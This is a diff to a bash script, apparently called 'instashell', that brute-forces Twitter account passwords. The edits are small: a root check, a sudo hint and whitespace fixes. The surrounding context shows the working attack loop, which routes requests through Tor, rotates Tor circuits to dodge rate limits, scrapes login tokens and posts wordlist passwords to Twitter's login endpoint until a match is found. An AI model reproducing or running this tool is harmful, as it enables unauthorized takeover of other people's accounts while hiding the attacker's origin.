@@ -5,6 +5,13 @@
 
 trap 'store;exit 1' 2
 
+checkroot() {
+  if [[ "$(id -u)" -ne 0 ]]; then
+    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
+    exit 1
+  fi
+}
+
 dependencies() {
   command -v tor > /dev/null 2>&1 ||
   {
@@ -30,6 +37,7 @@ banner() {
 }
 
 function start() {
+  checkroot
   banner
   dependencies
   read -p $'\e[1;92mUsername account: \e[0m' username
@@ -78,7 +86,7 @@ function store() {
       fi
       printf "username=\"%s\"\npassword=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $username $password $wl_pass $token > sessions/store.session.$username.$(date +"%FT%H%M")
       printf "\e[1;77mSession saved.\e[0m\n"
-      printf "\e[1;92mUse ./instashell --resume\n"
+      printf "\e[1;92mUse 'sudo ./instashell --resume'\n"
     else
       exit 1
     fi
@@ -86,7 +94,6 @@ function store() {
     exit 1
   fi
 }
-
 
 function changeip() {
   killall -HUP tor
@@ -114,7 +121,7 @@ function bruteforcer() {
       printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
 
       {(trap '' SIGINT && initpage=$(curl --socks5-hostname localhost:9050 -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new");
-        tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ;
+        tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1);
         var=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions");
         if [[ "$var" == *"/account/login_verification"* ]]; then
           printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password;
@@ -148,6 +155,7 @@ function bruteforcer() {
 }
 
 function resume() {
+  checkroot
   banner
   checktor
   counter=1
@@ -184,7 +192,7 @@ function resume() {
       printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
       let token++
       {(trap '' SIGINT && initpage=$(curl --socks5-hostname localhost:9050 -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new");
-        tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ;
+        tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1);
         var=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions");
         if [[ "$var" == *"/account/login_verification"* ]]; then
           printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password;
